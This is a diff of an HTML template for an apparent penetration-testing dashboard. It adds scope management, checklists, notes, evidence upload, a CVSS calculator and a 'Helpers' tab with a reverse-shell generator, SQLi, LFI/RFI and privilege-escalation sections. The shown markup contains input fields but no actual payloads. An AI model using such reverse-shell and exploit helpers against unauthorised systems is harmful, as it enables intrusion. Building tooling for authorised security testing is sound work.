@@ -13,9 +13,31 @@
     .pipeline-node { background: rgba(15,23,42,0.8); border: 1px solid rgba(255,255,255,0.1); border-radius: 0.75rem; padding: 1rem; min-width: 180px; position: relative; }
     .pipeline-node.active { border-color: rgba(139,92,246,0.5); box-shadow: 0 0 15px rgba(139,92,246,0.15); }
     .pipeline-connector { width: 40px; display: flex; align-items: center; justify-content: center; color: #475569; }
-    .tab-btn-manual { padding: 0.5rem 1rem; border-bottom: 2px solid transparent; color: #94a3b8; font-weight: 500; cursor: pointer; transition: all 0.2s; }
+    .tab-btn-manual { padding: 0.5rem 1rem; border-bottom: 2px solid transparent; color: #94a3b8; font-weight: 500; cursor: pointer; transition: all 0.2s; white-space: nowrap; }
     .tab-btn-manual:hover { color: white; }
     .tab-btn-manual.active { color: #a78bfa; border-bottom-color: #8b5cf6; }
+    .checklist-item.completed .checklist-text { text-decoration: line-through; color: #6b7280; }
+    .checklist-item.completed { opacity: 0.7; }
+    .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
+    .accordion-content.open { max-height: 2000px; }
+    .note-item.active { border-color: rgba(139,92,246,0.5); background: rgba(139,92,246,0.05); }
+    .evidence-card { transition: all 0.2s; border: 1px solid rgba(255,255,255,0.05); }
+    .evidence-card:hover { border-color: rgba(139,92,246,0.3); }
+    .evidence-dropzone { border: 2px dashed rgba(139,92,246,0.3); transition: all 0.2s; }
+    .evidence-dropzone.dragover { border-color: rgba(139,92,246,0.7); background: rgba(139,92,246,0.05); }
+    .cvss-btn { padding: 0.375rem 0.75rem; border-radius: 0.5rem; font-size: 0.75rem; cursor: pointer; transition: all 0.15s; border: 1px solid rgba(255,255,255,0.1); background: rgba(15,23,42,0.6); color: #94a3b8; }
+    .cvss-btn:hover { border-color: rgba(139,92,246,0.3); color: white; }
+    .cvss-btn.active { background: rgba(139,92,246,0.2); border-color: rgba(139,92,246,0.5); color: #a78bfa; }
+    .diff-add { background: rgba(34,197,94,0.1); color: #86efac; }
+    .diff-del { background: rgba(239,68,68,0.1); color: #fca5a5; }
+    .diff-unchanged { color: #6b7280; }
+    .scope-panel { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; }
+    .scope-panel.open { max-height: 600px; overflow-y: auto; }
+    .payload-row:hover { background: rgba(255,255,255,0.03); }
+    .payload-row .copy-btn { opacity: 0; transition: opacity 0.15s; }
+    .payload-row:hover .copy-btn { opacity: 1; }
+    .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 50; display: flex; align-items: center; justify-content: center; }
+    .modal-content { background: #1e293b; border: 1px solid rgba(255,255,255,0.1); border-radius: 0.75rem; max-width: 90vw; max-height: 85vh; overflow: auto; }
 </style>
 {% endblock %}
 
@@ -37,6 +59,18 @@
                 </button>
                 <button id="tab-cve" class="tab-btn-manual" onclick="switchManualTab('cve')">
                     <i class="fa-solid fa-shield-virus mr-1.5"></i> CVE Lookup
+                </button>
+                <button id="tab-checklists" class="tab-btn-manual" onclick="switchManualTab('checklists')">
+                    <i class="fa-solid fa-list-check mr-1.5"></i> Checklists
+                </button>
+                <button id="tab-notes" class="tab-btn-manual" onclick="switchManualTab('notes')">
+                    <i class="fa-solid fa-note-sticky mr-1.5"></i> Notes
+                </button>
+                <button id="tab-evidence" class="tab-btn-manual" onclick="switchManualTab('evidence')">
+                    <i class="fa-solid fa-camera mr-1.5"></i> Evidence
+                </button>
+                <button id="tab-helpers" class="tab-btn-manual" onclick="switchManualTab('helpers')">
+                    <i class="fa-solid fa-toolbox mr-1.5"></i> Helpers
                 </button>
             </div>
         </div>
@@ -67,6 +101,45 @@
             <button onclick="exportSession()" id="session-export-btn" class="hidden px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors">
                 <i class="fa-solid fa-file-export mr-1"></i> Export
             </button>
+            <button onclick="toggleScopePanel()" class="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors">
+                <i class="fa-solid fa-crosshairs mr-1"></i> Scope
+            </button>
+        </div>
+    </div>
+
+    <!-- Scope Panel (collapsible) -->
+    <div id="scope-panel" class="scope-panel glass-panel rounded-xl mb-3 shrink-0">
+        <div class="p-4">
+            <h3 class="text-sm font-bold text-white mb-3"><i class="fa-solid fa-crosshairs text-violet-400 mr-2"></i>Scope Management</h3>
+            <div class="mb-4">
+                <div class="text-[10px] font-bold text-slate-500 uppercase mb-2">Targets</div>
+                <div class="flex gap-2 mb-2">
+                    <select id="scope-target-type" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">
+                        <option value="ip">IP/CIDR</option><option value="domain">Domain</option><option value="url">URL</option>
+                    </select>
+                    <input type="text" id="scope-target-value" placeholder="Value" class="flex-1 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono">
+                    <input type="text" id="scope-target-notes" placeholder="Notes" class="w-32 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none">
+                    <button onclick="addScopeTarget()" class="px-2.5 py-1.5 bg-violet-600/80 hover:bg-violet-500 text-white rounded text-xs transition-colors"><i class="fa-solid fa-plus"></i></button>
+                </div>
+                <div id="scope-targets-list" class="space-y-1 max-h-32 overflow-y-auto"></div>
+            </div>
+            <div class="mb-4">
+                <div class="text-[10px] font-bold text-slate-500 uppercase mb-2">Exclusions</div>
+                <div class="flex gap-2 mb-2">
+                    <select id="scope-excl-type" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">
+                        <option value="ip">IP/CIDR</option><option value="domain">Domain</option><option value="url">URL</option>
+                    </select>
+                    <input type="text" id="scope-excl-value" placeholder="Value" class="flex-1 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono">
+                    <input type="text" id="scope-excl-reason" placeholder="Reason" class="w-32 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none">
+                    <button onclick="addScopeExclusion()" class="px-2.5 py-1.5 bg-rose-600/80 hover:bg-rose-500 text-white rounded text-xs transition-colors"><i class="fa-solid fa-plus"></i></button>
+                </div>
+                <div id="scope-exclusions-list" class="space-y-1 max-h-32 overflow-y-auto"></div>
+            </div>
+            <div class="mb-3">
+                <div class="text-[10px] font-bold text-slate-500 uppercase mb-2">Rules of Engagement</div>
+                <textarea id="scope-roe" rows="3" placeholder="Markdown notes about rules of engagement..." class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-xs text-white placeholder-slate-600 focus:outline-none font-mono"></textarea>
+            </div>
+            <button onclick="saveScope()" class="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded-lg text-xs font-medium transition-all"><i class="fa-solid fa-save mr-1"></i> Save Scope</button>
         </div>
     </div>
 
@@ -155,6 +228,7 @@
                     <div class="flex items-center gap-3 text-xs">
                         <span id="output-duration" class="text-slate-500 font-mono"></span>
                         <span id="output-findings-count" class="text-emerald-400 font-mono hidden"></span>
+                        <button onclick="openDiffModal()" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[10px] transition-colors" title="Compare outputs"><i class="fa-solid fa-code-compare mr-1"></i>Compare</button>
                     </div>
                 </div>
                 <div id="output-area" class="flex-1 overflow-y-auto p-4 font-mono text-sm text-slate-300 whitespace-pre-wrap">
@@ -166,6 +240,35 @@
                         <i class="fa-solid fa-magnifying-glass mr-1"></i> Parsed Findings
                     </div>
                     <div id="findings-list" class="p-3 space-y-2"></div>
+                </div>
+            </div>
+
+            <!-- Command History Panel -->
+            <div class="shrink-0">
+                <button onclick="toggleHistoryPanel()" class="w-full flex items-center justify-between px-4 py-2 bg-slate-900/80 border border-white/10 rounded-t-xl text-xs text-slate-400 hover:text-white transition-colors">
+                    <span><i class="fa-solid fa-clock-rotate-left mr-1.5"></i>Command History</span>
+                    <i id="history-chevron" class="fa-solid fa-chevron-up text-[10px] transition-transform rotate-180"></i>
+                </button>
+                <div id="history-panel" class="hidden bg-slate-900/80 border border-t-0 border-white/10 rounded-b-xl max-h-[250px] overflow-hidden">
+                    <div class="flex items-center gap-2 px-3 py-2 border-b border-white/5">
+                        <input type="text" id="history-search" placeholder="Search..." oninput="filterHistory()" class="flex-1 px-2 py-1 bg-black/30 border border-white/10 rounded text-[11px] text-white placeholder-slate-600 focus:outline-none font-mono">
+                        <select id="history-tool-filter" onchange="filterHistory()" class="px-2 py-1 bg-black/30 border border-white/10 rounded text-[11px] text-white focus:outline-none">
+                            <option value="">All tools</option>
+                        </select>
+                    </div>
+                    <div class="overflow-y-auto max-h-[190px]">
+                        <table class="w-full text-xs">
+                            <thead><tr class="text-[10px] text-slate-500 uppercase border-b border-white/5">
+                                <th class="px-3 py-1.5 text-left cursor-pointer" onclick="sortHistory('time')">Time</th>
+                                <th class="px-3 py-1.5 text-left cursor-pointer" onclick="sortHistory('tool')">Tool</th>
+                                <th class="px-3 py-1.5 text-left">Target</th>
+                                <th class="px-3 py-1.5 text-left cursor-pointer" onclick="sortHistory('status')">Status</th>
+                                <th class="px-3 py-1.5 text-left cursor-pointer" onclick="sortHistory('duration')">Duration</th>
+                                <th class="px-3 py-1.5 text-right">Actions</th>
+                            </tr></thead>
+                            <tbody id="history-list"></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
         </div>
@@ -262,11 +365,398 @@
             </div>
         </div>
     </div>
+
+    <!-- Checklists Tab -->
+    <div id="panel-checklists" class="hidden flex-1 min-h-0 flex flex-col lg:flex-row gap-4 animate-fade-in-up">
+        <!-- Sidebar -->
+        <div class="lg:w-64 shrink-0 flex flex-col gap-3">
+            <div>
+                <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Methodology</label>
+                <select id="checklist-methodology" onchange="loadChecklist()" class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white focus:outline-none">
+                    <option value="owasp">OWASP Top 10</option>
+                    <option value="network">Network Pentest</option>
+                    <option value="api">API Security</option>
+                    <option value="ad">Active Directory</option>
+                    <option value="ptes">PTES</option>
+                </select>
+            </div>
+            <div>
+                <div class="text-[10px] font-bold text-slate-500 uppercase mb-1">Progress</div>
+                <div class="w-full h-2.5 bg-slate-800 rounded-full overflow-hidden">
+                    <div id="checklist-progress-bar" class="h-full bg-emerald-500 rounded-full transition-all duration-300" style="width:0%"></div>
+                </div>
+                <div id="checklist-progress-text" class="text-[10px] text-slate-500 mt-1">0/0 completed</div>
+            </div>
+            <button onclick="resetChecklist()" class="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-xs transition-colors">
+                <i class="fa-solid fa-rotate-left mr-1"></i> Reset Checklist
+            </button>
+        </div>
+        <!-- Main -->
+        <div class="flex-1 min-h-0 overflow-y-auto glass-panel rounded-xl p-4">
+            <div id="checklist-content" class="space-y-3">
+                <div class="text-slate-500 text-sm text-center py-8">Select a methodology to load checklist.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notes Tab -->
+    <div id="panel-notes" class="hidden flex-1 min-h-0 flex flex-col lg:flex-row gap-4 animate-fade-in-up">
+        <!-- Sidebar -->
+        <div class="lg:w-64 shrink-0 flex flex-col gap-3">
+            <div class="flex gap-2">
+                <select id="notes-filter" onchange="filterNotes()" class="flex-1 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">
+                    <option value="all">All Notes</option>
+                    <option value="target">By Target</option>
+                    <option value="finding">By Finding</option>
+                </select>
+                <button onclick="createNote()" class="px-3 py-1.5 bg-violet-600/80 hover:bg-violet-500 text-white rounded text-xs transition-colors shrink-0">
+                    <i class="fa-solid fa-plus mr-1"></i>New
+                </button>
+            </div>
+            <div id="notes-list" class="flex-1 overflow-y-auto space-y-1 min-h-[100px]">
+                <div class="text-slate-500 text-xs text-center py-4">No notes yet</div>
+            </div>
+        </div>
+        <!-- Editor -->
+        <div class="flex-1 min-h-0 flex flex-col glass-panel rounded-xl p-4">
+            <div id="notes-editor-empty" class="flex-1 flex items-center justify-center text-slate-500 text-sm">
+                <div class="text-center"><i class="fa-solid fa-note-sticky text-3xl text-slate-600 mb-3"></i><p>Select or create a note</p></div>
+            </div>
+            <div id="notes-editor" class="hidden flex-1 flex flex-col">
+                <input type="text" id="note-title" placeholder="Note title..." oninput="onNoteEdit()" class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none mb-2 font-medium">
+                <div class="flex gap-2 mb-2">
+                    <select id="note-target" class="flex-1 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">
+                        <option value="">No target</option>
+                    </select>
+                    <select id="note-finding" class="flex-1 px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">
+                        <option value="">No finding</option>
+                    </select>
+                </div>
+                <div class="flex gap-1 mb-2 shrink-0">
+                    <button onclick="wrapNoteText('**','**')" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors font-bold" title="Bold">B</button>
+                    <button onclick="wrapNoteText('*','*')" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors italic" title="Italic">I</button>
+                    <button onclick="wrapNoteText('`','`')" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors font-mono" title="Code">&lt;&gt;</button>
+                    <button onclick="wrapNoteText('[','](url)')" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors" title="Link"><i class="fa-solid fa-link"></i></button>
+                    <button onclick="wrapNoteText('### ','')" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors" title="Heading">H</button>
+                    <div class="flex-1"></div>
+                    <button onclick="toggleNotePreview()" id="note-preview-toggle" class="px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-[11px] transition-colors"><i class="fa-solid fa-eye mr-1"></i>Preview</button>
+                </div>
+                <textarea id="note-content" placeholder="Write your notes here (Markdown supported)..." oninput="onNoteEdit()" class="flex-1 px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none font-mono resize-none"></textarea>
+                <div id="note-preview" class="hidden flex-1 overflow-y-auto px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-slate-200 prose prose-invert prose-sm"></div>
+                <div class="flex items-center gap-2 mt-2">
+                    <span id="note-autosave-status" class="text-[10px] text-slate-500"></span>
+                    <div class="flex-1"></div>
+                    <button onclick="deleteNote()" class="px-3 py-1.5 bg-rose-600/80 hover:bg-rose-500 text-white rounded text-xs transition-colors"><i class="fa-solid fa-trash mr-1"></i>Delete</button>
+                    <button onclick="saveCurrentNote()" class="px-3 py-1.5 bg-violet-600/80 hover:bg-violet-500 text-white rounded text-xs transition-colors"><i class="fa-solid fa-save mr-1"></i>Save</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Evidence Tab -->
+    <div id="panel-evidence" class="hidden flex-1 min-h-0 flex flex-col animate-fade-in-up">
+        <div class="glass-panel rounded-xl p-4 mb-3 shrink-0 flex items-center gap-3">
+            <label class="px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded-lg text-sm font-medium transition-all cursor-pointer">
+                <i class="fa-solid fa-upload mr-1.5"></i>Upload File
+                <input type="file" id="evidence-file-input" class="hidden" multiple onchange="uploadEvidence(this)">
+            </label>
+            <button onclick="pasteEvidence()" class="px-4 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-sm transition-colors">
+                <i class="fa-solid fa-paste mr-1.5"></i>Paste from Clipboard
+            </button>
+            <div class="flex-1"></div>
+            <select id="evidence-finding-filter" onchange="filterEvidence()" class="px-2 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white focus:outline-none">
+                <option value="">All findings</option>
+            </select>
+        </div>
+        <!-- Dropzone -->
+        <div id="evidence-dropzone" class="evidence-dropzone rounded-xl p-6 mb-3 shrink-0 text-center hidden">
+            <i class="fa-solid fa-cloud-arrow-up text-3xl text-violet-400/50 mb-2"></i>
+            <p class="text-slate-400 text-sm">Drop files here to upload</p>
+        </div>
+        <!-- Gallery -->
+        <div class="flex-1 min-h-0 overflow-y-auto">
+            <div id="evidence-grid" class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-3 p-1">
+                <div class="text-slate-500 text-sm text-center py-8 col-span-full">No evidence files yet. Upload or paste screenshots.</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Helpers Tab -->
+    <div id="panel-helpers" class="hidden flex-1 min-h-0 flex flex-col animate-fade-in-up">
+        <!-- Helpers Sub-Tabs -->
+        <div class="flex border-b border-white/10 mb-3 shrink-0 overflow-x-auto">
+            <button class="helper-tab-btn active px-3 py-2 text-xs font-medium text-violet-400 border-b-2 border-violet-500 whitespace-nowrap" onclick="switchHelperTab('revshell')"><i class="fa-solid fa-terminal mr-1.5"></i>Reverse Shells</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('encoder')"><i class="fa-solid fa-code mr-1.5"></i>Encoder/Decoder</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('ports')"><i class="fa-solid fa-network-wired mr-1.5"></i>Port Reference</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('wordlists')"><i class="fa-solid fa-list mr-1.5"></i>Wordlists</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('cvss')"><i class="fa-solid fa-calculator mr-1.5"></i>CVSS Calculator</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('lfi')"><i class="fa-solid fa-folder-open mr-1.5"></i>LFI/RFI</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('sqli')"><i class="fa-solid fa-database mr-1.5"></i>SQL Injection</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('privesc')"><i class="fa-solid fa-arrow-up mr-1.5"></i>Priv Esc</button>
+            <button class="helper-tab-btn px-3 py-2 text-xs font-medium text-slate-400 border-b-2 border-transparent hover:text-white whitespace-nowrap" onclick="switchHelperTab('adenum')"><i class="fa-solid fa-sitemap mr-1.5"></i>AD Enum</button>
+        </div>
+        <div class="flex-1 min-h-0 overflow-y-auto">
+
+        <!-- Reverse Shell Generator -->
+        <div id="helper-revshell" class="helper-panel">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="grid grid-cols-2 sm:grid-cols-3 gap-2 mb-3">
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Listener IP</label>
+                        <input type="text" id="revshell-ip" placeholder="10.0.0.1" class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none font-mono">
+                    </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Port</label>
+                        <input type="text" id="revshell-port" value="4444" class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none font-mono">
+                    </div>
+                    <div class="flex items-end">
+                        <label class="flex items-center gap-2 cursor-pointer">
+                            <input type="checkbox" id="revshell-b64wrap" class="accent-violet-500">
+                            <span class="text-[11px] text-slate-300">Base64 Wrap</span>
+                        </label>
+                    </div>
+                </div>
+                <!-- Category Filters -->
+                <div id="revshell-cat-filters" class="flex flex-wrap gap-1.5 mb-3"></div>
+                <!-- Shell List -->
+                <div id="revshell-list" class="space-y-1.5 mb-3 max-h-64 overflow-y-auto"></div>
+                <!-- Output -->
+                <pre id="revshell-output" class="bg-black rounded-lg p-3 text-xs text-emerald-400 font-mono overflow-x-auto max-h-40 border border-white/5 whitespace-pre-wrap">Select a shell above</pre>
+                <div class="flex gap-2 mt-2">
+                    <button onclick="copyToClipboard('revshell-output')" class="text-[10px] text-slate-400 hover:text-white transition-colors"><i class="fa-solid fa-copy mr-1"></i>Copy Shell</button>
+                    <button id="revshell-copy-listener" onclick="copyListenerCmd()" class="hidden text-[10px] text-violet-400 hover:text-white transition-colors"><i class="fa-solid fa-headphones mr-1"></i>Copy Listener</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Encoder/Decoder -->
+        <div id="helper-encoder" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="grid grid-cols-1 lg:grid-cols-2 gap-3 mb-3">
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Input</label>
+                        <textarea id="encode-input" rows="5" placeholder="Enter text to encode/decode" class="w-full px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none font-mono"></textarea>
+                        <div class="flex gap-2 mt-1">
+                            <label class="text-[10px] text-slate-500">Key (for XOR):</label>
+                            <input type="text" id="encode-key" placeholder="key" class="flex-1 px-2 py-0.5 bg-slate-900/60 border border-white/10 rounded text-[11px] text-white font-mono focus:outline-none">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Output</label>
+                        <pre id="encode-output" class="bg-black rounded-lg p-3 text-xs text-blue-400 font-mono overflow-auto border border-white/5 whitespace-pre-wrap" style="min-height:120px;max-height:200px;"></pre>
+                        <button onclick="copyToClipboard('encode-output')" class="mt-1 text-[10px] text-slate-400 hover:text-white transition-colors"><i class="fa-solid fa-copy mr-1"></i>Copy</button>
+                    </div>
+                </div>
+                <!-- Category Filters -->
+                <div id="encoder-cat-filters" class="flex flex-wrap gap-1.5 mb-3"></div>
+                <!-- Operation Buttons -->
+                <div id="encoder-ops" class="flex flex-wrap gap-1.5"></div>
+            </div>
+        </div>
+
+        <!-- Port Reference -->
+        <div id="helper-ports" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="flex flex-wrap items-center gap-2 mb-3">
+                    <input type="text" id="port-search" placeholder="Search port, service, tool, CVE..." oninput="filterPorts()" class="flex-1 px-3 py-2 bg-slate-900/60 border border-white/10 rounded-lg text-sm text-white placeholder-slate-600 focus:outline-none font-mono" style="min-width:200px;">
+                    <span id="port-count" class="text-[10px] text-slate-500"></span>
+                </div>
+                <div id="port-cat-filters" class="flex flex-wrap gap-1.5 mb-3"></div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs font-mono">
+                        <thead>
+                            <tr class="text-left text-[10px] text-slate-500 uppercase border-b border-white/5">
+                                <th class="px-2 py-1.5 w-16">Port</th>
+                                <th class="px-2 py-1.5 w-28">Service</th>
+                                <th class="px-2 py-1.5 w-16">Proto</th>
+                                <th class="px-2 py-1.5">Default Creds</th>
+                                <th class="px-2 py-1.5">Common Vulns</th>
+                                <th class="px-2 py-1.5">Tools</th>
+                            </tr>
+                        </thead>
+                        <tbody id="port-list"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Wordlist Manager -->
+        <div id="helper-wordlists" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <h3 class="text-sm font-bold text-white mb-3"><i class="fa-solid fa-list text-amber-400 mr-2"></i>Wordlists</h3>
+                <div id="wordlist-list" class="space-y-1.5 max-h-48 overflow-y-auto mb-3">
+                    <div class="text-slate-500 text-xs">Loading...</div>
+                </div>
+                <div class="flex gap-2">
+                    <button onclick="loadWordlists()" class="px-2.5 py-1 bg-slate-800 hover:bg-slate-700 border border-white/5 rounded text-[11px] text-slate-300 transition-colors"><i class="fa-solid fa-rotate mr-1"></i>Refresh</button>
+                    <label class="px-2.5 py-1 bg-violet-600/80 hover:bg-violet-500 text-white rounded text-[11px] transition-colors cursor-pointer">
+                        <i class="fa-solid fa-upload mr-1"></i>Upload
+                        <input type="file" id="wordlist-upload" class="hidden" onchange="uploadWordlist(this)">
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        </div><!-- end overflow-y-auto wrapper -->
+
+        <!-- CVSS Calculator -->
+        <div id="helper-cvss" class="helper-panel hidden">
+            <div class="glass-panel rounded-xl p-5">
+                <div class="flex flex-col lg:flex-row gap-6">
+                    <div class="flex-1 space-y-3">
+                        <h3 class="text-sm font-bold text-white mb-3"><i class="fa-solid fa-calculator text-violet-400 mr-2"></i>CVSS 3.1 Base Score</h3>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Attack Vector (AV)</label>
+                            <div class="flex gap-1.5" data-cvss="AV">
+                                <button class="cvss-btn" data-val="N" onclick="setCVSS(this)">Network</button>
+                                <button class="cvss-btn" data-val="A" onclick="setCVSS(this)">Adjacent</button>
+                                <button class="cvss-btn" data-val="L" onclick="setCVSS(this)">Local</button>
+                                <button class="cvss-btn" data-val="P" onclick="setCVSS(this)">Physical</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Attack Complexity (AC)</label>
+                            <div class="flex gap-1.5" data-cvss="AC">
+                                <button class="cvss-btn" data-val="L" onclick="setCVSS(this)">Low</button>
+                                <button class="cvss-btn" data-val="H" onclick="setCVSS(this)">High</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Privileges Required (PR)</label>
+                            <div class="flex gap-1.5" data-cvss="PR">
+                                <button class="cvss-btn" data-val="N" onclick="setCVSS(this)">None</button>
+                                <button class="cvss-btn" data-val="L" onclick="setCVSS(this)">Low</button>
+                                <button class="cvss-btn" data-val="H" onclick="setCVSS(this)">High</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">User Interaction (UI)</label>
+                            <div class="flex gap-1.5" data-cvss="UI">
+                                <button class="cvss-btn" data-val="N" onclick="setCVSS(this)">None</button>
+                                <button class="cvss-btn" data-val="R" onclick="setCVSS(this)">Required</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Scope (S)</label>
+                            <div class="flex gap-1.5" data-cvss="S">
+                                <button class="cvss-btn" data-val="U" onclick="setCVSS(this)">Unchanged</button>
+                                <button class="cvss-btn" data-val="C" onclick="setCVSS(this)">Changed</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Confidentiality (C)</label>
+                            <div class="flex gap-1.5" data-cvss="C">
+                                <button class="cvss-btn" data-val="N" onclick="setCVSS(this)">None</button>
+                                <button class="cvss-btn" data-val="L" onclick="setCVSS(this)">Low</button>
+                                <button class="cvss-btn" data-val="H" onclick="setCVSS(this)">High</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Integrity (I)</label>
+                            <div class="flex gap-1.5" data-cvss="I">
+                                <button class="cvss-btn" data-val="N" onclick="setCVSS(this)">None</button>
+                                <button class="cvss-btn" data-val="L" onclick="setCVSS(this)">Low</button>
+                                <button class="cvss-btn" data-val="H" onclick="setCVSS(this)">High</button>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Availability (A)</label>
+                            <div class="flex gap-1.5" data-cvss="A">
+                                <button class="cvss-btn" data-val="N" onclick="setCVSS(this)">None</button>
+                                <button class="cvss-btn" data-val="L" onclick="setCVSS(this)">Low</button>
+                                <button class="cvss-btn" data-val="H" onclick="setCVSS(this)">High</button>
+                            </div>
+                        </div>
+                        <div class="pt-2">
+                            <label class="block text-[10px] font-bold text-slate-500 uppercase mb-1">Import Vector String</label>
+                            <div class="flex gap-2">
+                                <input type="text" id="cvss-vector-input" placeholder="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" class="flex-1 px-3 py-1.5 bg-slate-900/60 border border-white/10 rounded text-xs text-white placeholder-slate-600 focus:outline-none font-mono">
+                                <button onclick="parseCVSSVector()" class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-white rounded text-xs transition-colors">Parse</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="lg:w-64 shrink-0">
+                        <div class="glass-panel rounded-xl p-4 sticky top-0">
+                            <div class="text-center mb-4">
+                                <div id="cvss-score" class="text-5xl font-bold text-white">-</div>
+                                <div id="cvss-severity" class="text-sm font-bold mt-1 px-3 py-1 rounded inline-block">Select all metrics</div>
+                            </div>
+                            <div class="mb-3">
+                                <div class="w-full h-3 bg-slate-800 rounded-full overflow-hidden">
+                                    <div id="cvss-bar" class="h-full rounded-full transition-all duration-300" style="width:0%"></div>
+                                </div>
+                                <div class="flex justify-between text-[9px] text-slate-500 mt-1"><span>0</span><span>10</span></div>
+                            </div>
+                            <div class="mb-3">
+                                <div class="text-[10px] font-bold text-slate-500 uppercase mb-1">Vector String</div>
